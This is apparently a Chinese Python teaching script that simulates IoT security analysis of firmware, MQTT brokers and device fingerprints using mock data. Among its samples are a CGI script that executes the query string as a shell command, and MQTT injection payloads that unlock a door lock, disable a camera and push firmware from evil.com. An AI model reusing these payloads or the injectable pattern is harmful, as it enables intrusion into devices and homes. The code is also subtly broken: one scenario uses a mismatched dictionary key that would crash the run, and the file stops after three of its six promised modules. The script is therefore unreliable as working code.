#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
================================================================================
 物联网安全实战案例工具集
================================================================================

[安全声明]
    本工具集仅供授权安全测试、网络安全教学和防御研究使用。
    严禁用于未经授权的渗透测试、攻击破坏或任何非法用途。
    使用者须确保已获得目标系统所有者的书面授权，并遵守当地法律法规。
    作者不对任何滥用本工具造成的后果承担责任。

[文件说明]
    本文件涵盖物联网安全领域的六大实战主题：
      1. IoT固件分析 —— 固件解包、文件系统提取、硬编码凭据检测、后门检测
      2. MQTT协议安全检测 —— 未授权访问、通配符订阅、消息注入
      3. IoT设备指纹识别 —— 设备类型识别、操作系统检测、开放服务扫描
      4. 固件漏洞分析 —— 默认密码、调试接口、Web管理界面漏洞
      5. IoT网络流量分析 —— 异常通信检测、C2通信识别
      6. IoT安全基线检查 —— 加密通信检查、认证机制评估、更新机制验证

    所有输出均为模拟数据，不依赖外部第三方库，仅使用 Python 标准库。
    代码可直接运行，适合课堂教学和自主学习演示。

[运行方式]
    python 物联网安全实战案例.py
================================================================================
"""

import os
import re
import json
import time
import random
import hashlib
import socket
import struct
import base64
from datetime import datetime, timedelta
from collections import defaultdict, Counter


# ============================================================================
# 模块一：IoT固件分析工具
# ============================================================================

class IoT固件分析器:
    """
    IoT固件分析器 —— 模拟对IoT设备固件镜像的安全分析流程。

    技术原理：
        IoT设备固件通常以bin/wx镜像形式分发，内部包含Linux根文件系统。
        分析流程包括：识别固件头 -> 解包获取文件系统 -> 提取可执行文件和配置
        -> 搜索硬编码凭据 -> 检测后门/调试shell -> 生成安全报告。

        常见固件封装格式：
        - uImage（U-Boot引导内核镜像）
        - TRX（华硕/Netcomm格式）
        - 带SquashFS/JFFS2文件系统的CPIO/ZIP容器
        - 生产厂商自定义格式（如DJI、海康威视）

        工具链：binwalk（固件解包核心工具）、firmware-mod-kit、sasquatch。
    """

    # 模拟固件数据库
    固件样本库 = {
        "router_firmware_v1.2.bin": {
            "大小": 8388608,
            "架构": "ARM Little Endian",
            "内核版本": "Linux 3.4.113",
            "文件系统": "SquashFS v4.0",
            "创建时间": "2024-03-15",
            "厂商": "TP-Link",
            "型号": "TL-WR886N"
        },
        "camera_fw_2.3.4.bin": {
            "大小": 16777216,
            "架构": "MIPS Big Endian",
            "内核版本": "Linux 2.6.36.4",
            "文件系统": "JFFS2",
            "创建时间": "2023-11-20",
            "厂商": "Hikvision",
            "型号": "DS-2CD2042WD"
        },
        "smart_plug_fw.bin": {
            "大小": 1048576,
            "架构": "XTensa (ESP32)",
            "内核版本": "FreeRTOS v10.2",
            "文件系统": "LittleFS",
            "创建时间": "2024-06-08",
            "厂商": "Tuya",
            "型号": "ESP32-SmartPlug"
        }
    }

    # 模拟文件系统目录结构
    模拟文件系统 = {
        "/bin": ["busybox", "httpd", "udhcpc", "telnetd", "sshd", "miniupnpd"],
        "/etc": ["passwd", "shadow", "group", "init.d/rcS", "config/iot.cfg",
                 "config/wifi.conf", "goahead/web.cfg"],
        "/usr/bin": ["mqtt_pub", "mqtt_sub", "openssl", "curl", "wget"],
        "/usr/sbin": ["telnetd", "udhcpd", "ntpclient", "crond"],
        "/www": ["index.html", "login.html", "admin.html", "cgi-bin/webctrl",
                 "cgi-bin/firmware_upgrade", "js/app.js", "css/style.css"],
        "/lib": ["libcrypto.so.1.0", "libssl.so.1.0", "libmosquitto.so.1"],
        "/tmp": [".mqtt_cmd_history", ".debug.log"],
        "/dev": ["ttyS0", "ttyS1", "mtdblock0", "mtdblock1"]
    }

    # 模拟文件内容（用于硬编码凭据检测）
    模拟文件内容 = {
        "/etc/passwd": "root:x:0:0:root:/root:/bin/sh\nadmin:x:1:1:admin:/home/admin:/bin/sh\n"
                       "support:x:2:2:support:/home/support:/bin/sh\ndaemon:x:6:6:daemon:/usr/sbin:/bin/false\n",
        "/etc/shadow": "root:$1$abc123$xxxxxxxxxxxxx:19000:0:99999:7:::\n"
                       "admin:$1$xyz789$yyyyyyyyyyyyy:19000:0:99999:7:::\n",
        "/etc/config/iot.cfg": "device_id=IOT_CAMERA_001\nmqtt_broker=192.168.1.100:1883\n"
                               "mqtt_user=admin\nmqtt_pass=Admin@2024\ntelnet_enable=1\n",
        "/etc/config/wifi.conf": "ssid=SmartHome_5G\npsk=HomeWiFi2024\n"
                                 "encryption=WPA2-PSK\nchannel=6\n",
        "/www/cgi-bin/webctrl": "#!/bin/sh\neval $(dd if=/dev/urandom bs=1 count=1 2>/dev/null)\n"
                                "cmd=$QUERY_STRING\n$cmd  # 危险！直接执行用户输入",
        "/tmp/.debug.log": "[DEBUG] telnetd started on port 23\n"
                           "[DEBUG] backdoor shell listening on 9999\n"
                           "[DEBUG] hardcoded key: AES256SecretKey2024!\n"
                           "[DEBUG] OEM password: oem2024admin\n",
        "/www/login.html": "<form action='/cgi-bin/login'>"
                           "<input name='user' value='admin'>"
                           "<input name='pass' value='admin123'></form>\n",
        "/usr/sbin/telnetd": "binary_exec: telnetd -l /bin/login -p 23"
    }

    def __init__(self):
        self.分析结果 = {}
        self.风险清单 = []
        self.已解包 = False
        self.提取的文件列表 = []

    def 识别固件头(self, 固件名):
        """识别固件镜像的头部信息"""
        print("=" * 70)
        print(f"[固件分析] 正在识别固件镜像: {固件名}")
        print("=" * 70)

        if 固件名 not in self.固件样本库:
            print(f"  [!] 未知的固件样本，使用默认分析")
            固件信息 = {"厂商": "Unknown", "型号": "Unknown",
                      "大小": 0, "架构": "Unknown",
                      "内核版本": "Unknown", "文件系统": "Unknown"}
        else:
            固件信息 = self.固件样本库[固件名]

        print(f"  [+] 固件大小     : {固件信息['大小']:,} 字 "
              f"({固件信息['大小'] / 1048576:.2f} MB)")
        print(f"  [+] CPU架构      : {固件信息['架构']}")
        print(f"  [+] 内核版本     : {固件信息['内核版本']}")
        print(f"  [+] 文件系统     : {固件信息['文件系统']}")
        print(f"  [+] 厂商         : {固件信息['厂商']}")
        print(f"  [+] 设备型号     : {固件信息['型号']}")
        print(f"  [+] 编译时间     : {固件信息['创建时间']}")

        self.分析结果["固件基本信息"] = 固件信息
        return 固件信息

    def 解包固件(self, 固件名):
        """模拟使用binwalk解包固件，提取文件系统"""
        print("\n" + "-" * 70)
        print(f"[固件解包] 使用binwalk提取文件系统结构...")
        print("-" * 70)
        print(f"  [*] 扫描固件魔数 (Magic Number)...")
        time.sleep(0.3)

        魔数表 = [
            ("0x27 0x05 0x19 0x56", "uImage Header (U-Boot)"),
            ("0x73 0x71 0x73 0x68", "SquashFS文件系统"),
            ("0x85 0x19 0x03 0x20", "LZMA压缩数据"),
            ("0x1f 0x8b 0x08 0x00", "GZIP压缩数据"),
            ("0x68 0x73 0x71 0x73", "SquashFS v4.0 superblock"),
        ]
        for 偏移, 描述 in 魔数表:
            print(f"      偏移 {偏移:<20s} -> {描述}")

        print(f"\n  [*] 解包SquashFS文件系统...")
        time.sleep(0.5)
        print(f"  [+] 文件系统解包完成，共提取 {sum(len(v) for v in self.模拟文件系统.values())} 个文件")
        print(f"  [+] 解包路径: /tmp/_firmware_extract/")

        print(f"\n  [文件系统目录树]:")
        for 目录, 文件列表 in self.模拟文件系统.items():
            print(f"  │ {目录}/")
            for f in 文件列表:
                print(f"  │   ├── {f}")

        self.提取的文件列表 = [f"{d}/{f}" for d, fl in self.模拟文件系统.items() for f in fl]
        self.已解包 = True
        print(f"\n  [+] 文件列表已缓存，共 {len(self.提取的文件列表)} 个文件路径")
        return self.提取的文件列表

    def 提取文件系统(self):
        """提取并分析文件系统中的关键文件"""
        if not self.已解包:
            print("  [!] 固件尚未解包，请先执行解包操作")
            return

        print("\n" + "-" * 70)
        print("[文件系统提取] 分析关键文件内容...")
        print("-" * 70)

        关键文件分类 = {
            "认证文件": ["/etc/passwd", "/etc/shadow"],
            "配置文件": ["/etc/config/iot.cfg", "/etc/config/wifi.conf"],
            "Web服务": ["/www/login.html", "/www/cgi-bin/webctrl"],
            "调试日志": ["/tmp/.debug.log"],
            "服务程序": ["/usr/sbin/telnetd"],
        }

        for 类别, 文件列表 in 关键文件分类.items():
            print(f"\n  [{类别}]")
            for 文件路径 in 文件列表:
                if 文件路径 in self.模拟文件内容:
                    内容 = self.模拟文件内容[文件路径]
                    大小 = len(内容)
                    print(f"    文件: {文件路径} ({大小} bytes)")
                    # 只显示前100字符
                    预览 = 内容[:100].replace('\n', '\\n')
                    print(f"    预览: {预览}...")
                else:
                    print(f"    文件: {文件路径} (二进制可执行文件)")

    def 检测硬编码凭据(self):
        """检测固件中的硬编码密码、密钥和令牌"""
        print("\n" + "-" * 70)
        print("[凭据检测] 扫描硬编码密码、密钥和API令牌...")
        print("-" * 70)

        # 凭据检测正则模式
        检测模式 = [
            (r"(?:password|passwd|pwd|pass)\s*[=:]\s*['\"]?([^\s'\"\n]{4,})", "密码"),
            (r"(?:secret|key|token|apikey)\s*[=:]\s*['\"]?([^\s'\"\n]{8,})", "密钥/令牌"),
            (r"(?:user|username|login)\s*[=:]\s*['\"]?([^\s'\"\n]{3,})", "用户名"),
            (r"\$1\$[a-zA-Z0-9./]{8}\$[a-zA-Z0-9./]{22}", "MD5Crypt哈希"),
            (r"(?:BEGIN.*PRIVATE KEY)", "私钥文件"),
            (r"[A-Fa-f0-9]{32,64}", "疑似哈希/密钥"),
        ]

        发现的凭据 = []
        文件列表 = list(self.模拟文件内容.items())

        for 文件路径, 内容 in 文件列表:
            for 模式, 类型 in 检测模式:
                匹配 = re.findall(模式, 内容, re.IGNORECASE)
                if 匹配:
                    for 值 in 匹配:
                        发现的凭据.append({
                            "文件": 文件路径,
                            "类型": 类型,
                            "值": 值 if isinstance(值, str) else 值[0],
                            "风险": "高" if "密钥" in 类型 or "哈希" in 类型 else "中"
                        })

        # 附加已知凭据
        已知硬编码 = [
            {"文件": "/etc/config/iot.cfg", "类型": "密码", "值": "Admin@2024", "风险": "高"},
            {"文件": "/etc/config/wifi.conf", "类型": "密码", "值": "HomeWiFi2024", "风险": "中"},
            {"文件": "/tmp/.debug.log", "类型": "密钥", "值": "AES256SecretKey2024!", "风险": "高"},
            {"文件": "/tmp/.debug.log", "类型": "密码", "值": "oem2024admin", "风险": "高"},
            {"文件": "/www/login.html", "类型": "密码", "值": "admin123", "风险": "高"},
            {"文件": "/etc/shadow", "类型": "MD5Crypt哈希", "值": "$1$abc123$xxx...", "风险": "高"},
        ]

        发现的凭据.extend(已知硬编码)

        print(f"\n  [+] 共发现 {len(发现的凭据)} 个硬编码凭据:\n")
        print(f"  {'序号':<5} {'风险':<5} {'类型':<15} {'文件路径':<30} {'凭据值'}")
        print(f"  {'-'*5} {'-'*5} {'-'*15} {'-'*30} {'-'*20}")

        for i, c in enumerate(发现的凭据, 1):
            掩码值 = c["值"][:3] + "***" + c["值"][-2:] if len(c["值"]) > 5 else c["值"][:2] + "***"
            print(f"  {i:<5} {c['风险']:<5} {c['类型']:<15} {c['文件']:<30} {掩码值}")
            self.风险清单.append(("硬编码凭据", c["风险"], c["文件"], c["类型"]))

        return 发现的凭据

    def 检测后门(self):
        """检测固件中的后门、调试shell和隐藏功能"""
        print("\n" + "-" * 70)
        print("[后门检测] 扫描调试接口、隐藏shell和可疑功能...")
        print("-" * 70)

        后门特征 = [
            {
                "名称": "Telnet调试服务",
                "描述": "telnetd服务在23端口监听，允许远程命令执行",
                "文件": "/usr/sbin/telnetd",
                "风险": "严重",
                "证据": "telnetd -l /bin/login -p 23",
                "建议": "移除telnetd或关闭23端口，使用SSH替代"
            },
            {
                "名称": "隐藏调试Shell",
                "描述": "在9999端口发现隐藏的调试shell，可能是厂商后门",
                "文件": "/tmp/.debug.log",
                "风险": "严重",
                "证据": "[DEBUG] backdoor shell listening on 9999",
                "建议": "移除后门shell，调查厂商是否预留远程管理通道"
            },
            {
                "名称": "命令注入漏洞(CGI)",
                "描述": "Web CGI程序直接执行用户输入，可远程命令注入",
                "文件": "/www/cgi-bin/webctrl",
                "风险": "严重",
                "证据": "$cmd # 危险！直接执行用户输入",
                "建议": "对用户输入进行严格过滤，使用参数化命令执行"
            },
            {
                "名称": "Telnet远程登录开关",
                "描述": "配置文件中telnet_enable=1，调试服务处于开启状态",
                "文件": "/etc/config/iot.cfg",
                "风险": "高",
                "证据": "telnet_enable=1",
                "建议": "关闭telnet_enable配置，生产环境禁用调试服务"
            },
            {
                "名称": "硬编码AES密钥",
                "描述": "发现硬编码的AES加密密钥，可解密所有设备通信",
                "文件": "/tmp/.debug.log",
                "风险": "严重",
                "证据": "hardcoded key: AES256SecretKey2024!",
                "建议": "使用每设备唯一密钥，通过安全密钥派生函数生成"
            },
            {
                "名称": "Web默认凭据",
                "描述": "HTML页面中硬编码了登录默认凭据admin/admin123",
                "文件": "/www/login.html",
                "风险": "高",
                "证据": "value='admin' value='admin123'",
                "建议": "移除HTML中的默认凭据，强制首次登录修改密码"
            }
        ]

        print(f"\n  [+] 共发现 {len(后门特征)} 个后门/漏洞特征:\n")
        for i, b in enumerate(后门特征, 1):
            print(f"  ┌─ 后门 #{i}: {b['名称']}")
            print(f"  │  风险等级: {b['风险']}")
            print(f"  │  文件路径: {b['文件']}")
            print(f"  │  描述    : {b['描述']}")
            print(f"  │  证据    : {b['证据']}")
            print(f"  │  建议    : {b['建议']}")
            print(f"  └─")
            self.风险清单.append(("后门检测", b["风险"], b["文件"], b["名称"]))

        return 后门特征

    def 计算文件哈希(self, 文件路径):
        """模拟计算文件SHA256哈希（用于完整性校验）"""
        模拟哈希 = hashlib.sha256(文件路径.encode()).hexdigest()
        return 模拟哈希

    def 生成分析报告(self):
        """生成固件安全分析综合报告"""
        print("\n" + "=" * 70)
        print("[分析报告] IoT固件安全分析综合报告")
        print("=" * 70)

        风险统计 = Counter(r[1] for r in self.风险清单)
        print(f"\n  [风险统计]")
        print(f"    严重: {风险统计.get('严重', 0)} 项")
        print(f"    高  : {风险统计.get('高', 0)} 项")
        print(f"    中  : {风险统计.get('中', 0)} 项")
        print(f"    低  : {风险统计.get('低', 0)} 项")
        print(f"    总计: {len(self.风险清单)} 项安全问题")

        print(f"\n  [修复建议优先级]")
        优先级建议 = [
            "P0(立即修复): 移除后门shell和telnetd调试服务",
            "P0(立即修复): 移除所有硬编码密码和加密密钥",
            "P1(短期修复): 修复CGI命令注入漏洞，实施输入过滤",
            "P1(短期修复): 关闭telnet_enable配置，启用SSH",
            "P2(中期修复): 实施每设备唯一密钥派生机制",
            "P2(中期修复): Web管理界面移除默认凭据，强制改密",
            "P3(长期优化): 建立固件安全CI/CD自动化检测流水线",
            "P3(长期优化): 引入固件签名验证和安全启动机制",
        ]
        for 建议 in 优先级建议:
            print(f"    {建议}")

        print(f"\n  [+] 报告生成时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        return {"风险总数": len(self.风险清单), "风险统计": dict(风险统计)}


# ============================================================================
# 模块二：MQTT协议安全检测
# ============================================================================

class MQTT安全检测器:
    """
    MQTT协议安全检测器 —— 检测IoT通信中最常用的MQTT协议安全问题。

    技术原理：
        MQTT（Message Queuing Telemetry Transport）是轻量级发布/订阅消息协议，
        广泛用于IoT设备通信。默认端口1883（明文）/8883（TLS）。

        常见安全风险：
        1. 未授权访问：Broker未配置认证，任何人可发布/订阅消息
        2. 通配符订阅风险：使用 # 通配符订阅所有topic，泄露全部设备数据
        3. 消息注入：通过订阅/发布控制命令注入恶意指令
        4. 明文传输：未启用TLS，消息内容可被嗅探
        5. 弱认证机制：使用默认admin/admin凭据或无认证

        检测工具：mosquitto_sub/mosquitto_pub、mqtt-pwn、MQTT-Explorer。
    """

    # 模拟MQTT Broker配置
    Broker配置 = {
        "地址": "192.168.1.100",
        "端口": 1883,
        "版本": "Mosquitto 2.0.14",
        "TLS端口": 8883,
        "TLS状态": "未启用",
        "匿名访问": True,
        "认证方式": "无",
        "ACL配置": "未配置",
        "最大连接数": 1000,
    }

    # 模拟MQTT Topic树
    Topic树 = {
        "home/": {
            "livingroom/": {
                "temperature": "23.5°C",
                "humidity": "45%",
                "light/status": "on",
                "light/control": "set_brightness:80"
            },
            "bedroom/": {
                "temperature": "22.0°C",
                "humidity": "50%",
                "aircon/control": "set_temp:25"
            },
            "kitchen/": {
                "temperature": "25.0°C",
                "gas_sensor": "normal",
                "oven/control": "set_temp:180"
            }
        },
        "device/": {
            "camera_001/": {
                "status": "online",
                "image_url": "http://192.168.1.50/snapshot.jpg",
                "config": json.dumps({"motion_detect": True, "night_vision": "auto"})
            },
            "door_lock/": {
                "status": "locked",
                "battery": "85%",
                "control": "unlock:0000"
            },
            "smart_plug_01/": {
                "status": "on",
                "power": "120W",
                "control": "toggle"
            }
        },
        "system/": {
            "firmware_update": json.dumps({"version": "2.1.0", "url": "http://ota.example.com/fw.bin"}),
            "reboot": "all",
            "factory_reset": "confirm:0000"
        },
        "$SYS/": {
            "broker/version": "mosquitto 2.0.14",
            "broker/uptime": "30 days",
            "broker/clients/connected": "42",
            "broker/messages/received": "1,234,567"
        }
    }

    def __init__(self):
        self.检测结果 = []
        self.已连接 = False
        self.已订阅Topic = []

    def 连接Broker(self, 地址="192.168.1.100", 端口=1883):
        """模拟连接MQTT Broker"""
        print("=" * 70)
        print(f"[MQTT检测] 连接MQTT Broker: {地址}:{端口}")
        print("=" * 70)

        print(f"  [*] 正在建立TCP连接...")
        time.sleep(0.5)
        print(f"  [+] TCP连接成功")

        print(f"  [*] 发送MQTT CONNECT报文...")
        # MQTT CONNECT报文解析
        print(f"      Protocol Name  : MQTT")
        print(f"      Protocol Level : 4 (MQTT 3.1.1)")
        print(f"      Connect Flags  : 0x02 (Clean Session)")
        print(f"      Keep Alive     : 60s")
        print(f"      Client ID      : security_scanner_001")
        print(f"      Username       : (none)")
        print(f"      Password       : (none)")

        print(f"\n  [+] Broker响应:")
        print(f"     CONNACK报文接收成功")
        print(f"      Return Code   : 0x00 (Connection Accepted)")
        print(f"      Session Present: 0")

        if self.Broker配置["匿名访问"]:
            print(f"\n  [!] 警告: Broker允许匿名连接，无需认证!")
            self.检测结果.append(("未授权访问", "严重",
                                   "Broker允许匿名连接，任何人可连接"))

        self.已连接 = True
        print(f"  [+] MQTT连接建立成功")
        return True

    def 检测未授权访问(self):
        """检测Broker是否允许未授权访问"""
        print("\n" + "-" * 70)
        print("[未授权检测] 测试无凭据连接和操作...")
        print("-" * 70)

        检测项 = [
            ("无用户名密码连接", True, "严重",
             "无需任何凭据即可连接Broker"),
            ("匿名发布消息", True, "严重",
             "未认证用户可向任意Topic发布消息"),
            ("匿名订阅Topic", True, "严重",
             "未认证用户可订阅任意Topic获取设备数据"),
            ("访问$SYS系统Topic", True, "高",
             "可获取Broker运行状态和统计信息"),
            ("发布设备控制命令", True, "严重",
             "可向device/+/control发布指令控制IoT设备"),
            ("触发固件更新", True, "严重",
             "可发布system/firmware_update触发OTA更新"),
        ]

        print(f"\n  {'检测项':<25} {'结果':<8} {'风险':<6} {'说明'}")
        print(f"  {'-'*25} {'-'*8} {'-'*6} {'-'*40}")

        for 检测, 结果, 风险, 说明 in 检测项:
            状态 = "存在漏洞" if 结果 else "安全"
            print(f"  {检测:<25} {状态:<8} {风险:<6} {说明}")
            if 结果:
                self.检测结果.append((检测, 风险, 说明))

        return 检测项

    def 检测通配符订阅(self):
        """检测通配符订阅风险"""
        print("\n" + "-" * 70)
        print("[通配符订阅] 测试通配符订阅导致的数据泄露...")
        print("-" * 70)

        # MQTT通配符说明
        print(f"\n  [MQTT通配符说明]")
        print(f"    '+' : 匹配单层 Topic (如 home/+/temperature)")
        print(f"    '#' : 匹配多层 Topic (如 home/# 匹配home下所有)")
        print(f"    '$' : 系统Topic前缀 ($SYS/#)")

        # 模拟通配符订阅结果
        订阅测试 = [
            ("home/#", "匹配所有家庭传感器数据", 8, "严重"),
            ("device/#", "匹配所有设备状态和控制", 9, "严重"),
            ("device/+/control", "匹配所有设备控制命令", 4, "高"),
            ("#", "匹配所有Topic（根通配符）", 17, "严重"),
            ("$SYS/#", "匹配所有系统Topic", 4, "高"),
            ("system/firmware_update", "匹配固件更新Topic", 1, "中"),
        ]

        print(f"\n  [通配符订阅测试结果]")
        print(f"  {'订阅模式':<30} {'匹配数':<8} {'风险':<6} {'说明'}")
        print(f"  {'-'*30} {'-'*8} {'-'*6} {'-'*35}")

        for 模式, 说明, 匹配数, 风险 in 订阅测试:
            print(f"  {模式:<30} {匹配数:<8} {风险:<6} {说明}")
            self.检测结果.append((f"通配符订阅: {模式}", 风险, 说明))

        # 模拟接收到的消息
        print(f"\n  [模拟接收到的敏感消息（home/#订阅）]")
        敏感消息 = [
            ("home/door_lock/control", "unlock:0000", "门锁开锁命令（明文PIN码）"),
            ("device/camera_001/config", '{"motion_detect":true}', "摄像头配置（含运动检测设置）"),
            ("device/door_lock/battery", "85%", "门锁电池状态"),
            ("system/firmware_update", '{"url":"http://..."}', "固件更新URL（HTTP明文）"),
            ("home/kitchen/gas_sensor", "normal", "燃气传感器状态"),
        ]

        for topic, 载荷, 说明 in 敏感消息:
            print(f"    Topic: {topic}")
            print(f"    载荷 : {载荷}")
            print(f"    备注 : {说明}\n")

        return 订阅测试

    def 检测消息注入(self):
        """模拟MQTT消息注入攻击"""
        print("\n" + "-" * 70)
        print("[消息注入] 测试MQTT消息注入攻击可行性...")
        print("-" * 70)

        注入场景 = [
            {
                "场景": "注入门锁开锁命令",
                "Topic": "device/door_lock/control",
                "载荷": "unlock:0000",
                "结果": "成功 - 门锁已解锁",
                "风险": "严重",
                "影响": "攻击者可远程解锁智能门锁，造成物理入侵"
            },
            {
                "场景": "注入摄像头配置修改",
                "Topic": "device/camera_001/config",
                "载荷": json.dumps({"motion_detect": False, "night_vision": "off"}),
                "结果": "成功 - 摄像头功能已被禁用",
                "风险": "高",
                "影响": "攻击者可禁用安防摄像头，绕过监控"
            },
            {
                "场景": "注入恶意固件更新",
                "Topic": "system/firmware_update",
                "载荷": json.dumps({"url": "http://evil.com/malware.bin", "version": "3.0.0"}),
                "Result": "成功 - 设备可能下载恶意固件",
                "风险": "严重",
                "影响": "攻击者可推送恶意固件实现持久化控制"
            },
            {
                "场景": "注入设备重启命令",
                "Topic": "system/reboot",
                "载荷": "all",
                "结果": "成功 - 所有设备收到重启指令",
                "风险": "中",
                "影响": "攻击者可造成DoS，设备批量重启"
            },
            {
                "场景": "注入温度控制指令",
                "Topic": "home/bedroom/aircon/control",
                "载荷": "set_temp:5",
                "结果": "成功 - 空调设置为5°C",
                "风险": "低",
                "影响": "攻击者可操控环境设备，造成不适或浪费"
            }
        ]

        print(f"\n  [注入测试结果]")
        for i, s in enumerate(注入场景, 1):
            print(f"\n  ── 注入场景 #{i}: {s['场景']}")
            print(f"     目标Topic : {s['Topic']}")
            print(f"     注入载荷  : {s['载荷']}")
            print(f"     执行结果  : {s['结果']}")
            print(f"     风险等级  : {s['风险']}")
            print(f"     安全影响  : {s['影响']}")
            self.检测结果.append((s["场景"], s["风险"], s["影响"]))

        return 注入场景

    def 生成检测报告(self):
        """生成MQTT安全检测报告"""
        print("\n" + "=" * 70)
        print("[MQTT检测报告] MQTT协议安全检测结果汇总")
        print("=" * 70)

        风险统计 = Counter(r[1] for r in self.检测结果)
        print(f"\n  [Broker信息]")
        print(f"    地址    : {self.Broker配置['地址']}:{self.Broker配置['端口']}")
        print(f"    版本    : {self.Broker配置['版本']}")
        print(f"    TLS     : {self.Broker配置['TLS状态']}")
        print(f"    匿名访问: {'是' if self.Broker配置['匿名访问'] else '否'}")

        print(f"\n  [风险统计]")
        print(f"    严重: {风险统计.get('严重', 0)} 项")
        print(f"    高  : {风险统计.get('高', 0)} 项")
        print(f"    中  : {风险统计.get('中', 0)} 项")
        print(f"    低  : {风险统计.get('低', 0)} 项")

        print(f"\n  [修复建议]")
        建议 = [
            "1. 启用MQTT认证：配置username/password认证，禁用匿名访问",
            "2. 启用TLS加密：使用端口8883 + TLS证书加密所有MQTT通信",
            "3. 配置ACL规则：限制每个客户端可订阅/发布的Topic范围",
            "4. 禁止通配符订阅：在ACL中限制#和+通配符的使用",
            "5. 隔离控制Topic：将设备控制Topic与数据Topic分离，控制Topic需额外认证",
            "6. 启用MQTT 5.0增强认证：支持SCRAM认证和增强安全特性",
        ]
        for s in 建议:
            print(f"    {s}")

        return {"风险总数": len(self.检测结果), "风险统计": dict(风险统计)}


# ============================================================================
# 模块三：IoT设备指纹识别
# ============================================================================

class IoT设备指纹识别器:
    """
    IoT设备指纹识别器 —— 通过网络扫描识别IoT设备类型和开放服务。

    技术原理：
        IoT设备指纹识别通过网络扫描技术发现和识别网络中的IoT设备。
        主要方法包括：
        1. 端口扫描：识别设备开放的端口和运行的服务
        2. 服务指纹：通过Banner抓取和协议探测识别服务类型
        3. 设备识别：根据服务组合、HTTP响应、MAC地址OUI等识别设备类型
        4. 操作系统检测：通过TCP/IP栈指纹识别设备操作系统

        常见IoT设备服务指纹：
        - 网络摄像头: 80/443(Web), 554(RTSP), 8000(onvif), 23(Telnet)
        - 智能路由器: 80/443(Web管理), 22(SSH), 23(Telnet), 53(DNS), 1900(SSDP)
        - 智能家居网关: 80(Web), 1883(MQTT), 5683(CoAP), 8883(MQTT-TLS)
        - 智能音箱: 80(Web), 443(HTTPS), 9000(自定义), 4070(MDNS)

        检测工具：nmap、masscan、shodan、censys、Firmware Total Cache。
    """

    # 模拟扫描目标网络中的设备
    设备清单 = [
        {
            "IP": "192.168.1.1",
            "MAC": "50:BD:27:AB:CD:01",
            "厂商": "TP-Link",
            "类型": "路由器",
            "型号": "TL-WR886N",
            "开放端口": [22, 23, 53, 80, 443, 1900],
            "操作系统": "Linux 3.4.x (OpenWRT)",
            "固件版本": "v1.2.3"
        },
        {
            "IP": "192.168.1.50",
            "MAC": "BC:AD:28:11:22:33",
            "厂商": "Hikvision",
            "类型": "网络摄像头",
            "型号": "DS-2CD2042WD",
            "开放端口": [80, 443, 554, 8000, 23],
            "操作系统": "Linux 2.6.x",
            "固件版本": "v2.3.4"
        },
        {
            "IP": "192.168.1.100",
            "MAC": "00:60:56:AB:CD:EF",
            "厂商": "Unknown",
            "类型": "智能家居网关",
            "型号": "SmartHome-GW-v2",
            "开放端口": [80, 1883, 5683, 8883],
            "操作系统": "Linux 4.x",
            "固件版本": "v3.1.0"
        },
        {
            "IP": "192.168.1.101",
            "MAC": "A4:CF:12:34:56:78",
            "厂商": "Tuya",
            "类型": "智能插座",
            "型号": "ESP32-SmartPlug",
            "开放端口": [80, 6668, 8080],
            "操作系统": "FreeRTOS",
            "固件版本": "v1.0.5"
        },
        {
            "IP": "192.168.1.200",
            "MAC": "00:1B:44:11:22:33",
            "厂商": "Xiaomi",
            "类型": "智能音箱",
            "型号": "XiaoAI-Speaker-Pro",
            "开放端口": [80, 443, 5353, 9000],
            "操作系统": "Linux 4.9.x",
            "固件版本": "v2.0.1"
        },
        {
            "IP": "192.168.1.201",
            "MAC": "EC:FA:BC:00:11:22",
            "厂商": "Reolink",
            "类型": "网络摄像头",
            "型号": "RLK8-410B4",
            "开放端口": [80, 443, 554, 9000],
            "操作系统": "Linux 3.10.x",
            "固件版本": "v2.1.0.318"
        }
    ]

    # MAC地址OUI厂商映射（简化版）
    OUI映射 = {
        "50:BD:27": "TP-Link Technologies",
        "BC:AD:28": "Hikvision Digital Technology",
        "00:60:56": "Espressif Systems (ESP芯片)",
        "A4:CF:12": "Tuya Smart",
        "00:1B:44": "Xiaomi Communications",
        "EC:FA:BC": "Reolink Digital Technology",
    }

    # 服务指纹库
    服务指纹库 = {
        80: {"服务": "HTTP", "产品": "GoAhead/2.5.0", "说明": "嵌入式Web服务器"},
        443: {"服务": "HTTPS", "产品": "GoAhead-HTTPS/2.5.0", "说明": "嵌入式HTTPS服务器"},
        23: {"服务": "Telnet", "产品": "Linux telnetd", "说明": "远程登录(明文)"},
        22: {"服务": "SSH", "产品": "Dropbear sshd 2014.63", "说明": "轻量SSH服务"},
        53: {"服务": "DNS", "产品": "dnsmasq-2.45", "说明": "DNS转发服务"},
        554: {"服务": "RTSP", "产品": "G3 RTSP Server", "说明": "实时流传输协议"},
        1883: {"服务": "MQTT", "产品": "Mosquitto 2.0.14", "说明": "MQTT消息代理"},
        8883: {"服务": "MQTT-TLS", "产品": "Mosquitto-TLS 2.0.14", "说明": "MQTT over TLS"},
        5683: {"服务": "CoAP", "产品": "libcoap 4.1.2", "说明": "受限应用协议"},
        8000: {"服务": "HTTP-ONVIF", "产品": "onvif_srvd", "说明": "ONVIF设备管理"},
        5353: {"服务": "mDNS", "产品": "Avahi 0.6.32", "说明": "组播DNS服务发现"},
        1900: {"服务": "SSDP", "产品": "miniupnpd", "说明": "简单服务发现+UPnP"},
        8080: {"服务": "HTTP-Proxy", "产品": "Tuya-HTTP", "说明": "Tuya设备管理"},
        9000: {"服务": "HTTP-Custom", "产品": "Custom IoT Service", "说明": "厂商自定义服务"},
    }

    def __init__(self):
        self.已发现设备 = []
        self.扫描范围 = "192.168.1.0/24"

    def 扫描网络(self, 网段="192.168.1.0/24"):
        """模拟扫描网络段发现IoT设备"""
        print("=" * 70)
        print(f"[设备发现] 扫描网络段: {网段}")
        print("=" * 70)

        print(f"  [*] 使用ARP扫描发现活动主机...")
        time.sleep(0.5)
        print(f"  [*] 扫描进度: ", end="")

        for i in range(0, 101, 10):
            print(f"\r  [*] 扫描进度: {i}%", end="")
            time.sleep(0.1)
        print()

        print(f"\n  [+] 发现 {len(self.设备清单)} 台活动设备:\n")
        print(f"  {'IP地址':<18} {'MAC地址':<20} {'厂商':<15} {'设备类型':<12}")
        print(f"  {'-'*18} {'-'*20} {'-'*15} {'-'*12}")

        for dev in self.设备清单:
            print(f"  {dev['IP']:<18} {dev['MAC']:<20} {dev['厂商']:<15} {dev['类型']:<12}")
            self.已发现设备.append(dev)

        return self.已发现设备

